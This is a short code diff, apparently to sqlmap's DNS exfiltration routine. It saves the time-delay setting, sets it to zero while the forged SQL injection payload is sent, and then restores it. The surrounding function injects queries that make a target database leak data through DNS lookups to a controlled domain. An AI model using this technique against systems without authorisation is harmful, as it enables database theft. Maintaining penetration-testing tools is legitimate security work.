@@ -20,6 +20,8 @@ from lib.core.common import extractRegexResult
 from lib.core.common import getSPQLSnippet
 from lib.core.common import hashDBRetrieve
 from lib.core.common import hashDBWrite
+from lib.core.common import popValue
+from lib.core.common import pushValue
 from lib.core.common import randomInt
 from lib.core.common import randomStr
 from lib.core.common import safecharencode
@@ -70,6 +72,9 @@ def dnsUse(payload, expression):
                 expressionRequest = getSPQLSnippet(Backend.getIdentifiedDbms(), "dns_request", PREFIX=prefix, QUERY=expressionReplaced, SUFFIX=suffix, DOMAIN=conf.dName)
                 expressionUnescaped = unescaper.unescape(expressionRequest)
 
+                pushValue(conf.timeSec)
+                conf.timeSec = 0
+
                 if Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.PGSQL):
                     comment = queries[Backend.getIdentifiedDbms()].comment.query
                     query = agent.prefixQuery("; %s" % expressionUnescaped)
@@ -77,8 +82,9 @@ def dnsUse(payload, expression):
                     forgedPayload = agent.payload(newValue=query)
                 else:
                     forgedPayload = safeStringFormat(payload, (expressionUnescaped, randomInt(1), randomInt(3)))
-    
+
                 Request.queryPage(forgedPayload, content=False, noteResponseTime=False, raise404=False)
+                conf.timeSec = popValue()
 
                 _ = conf.dnsServer.pop(prefix, suffix)
 
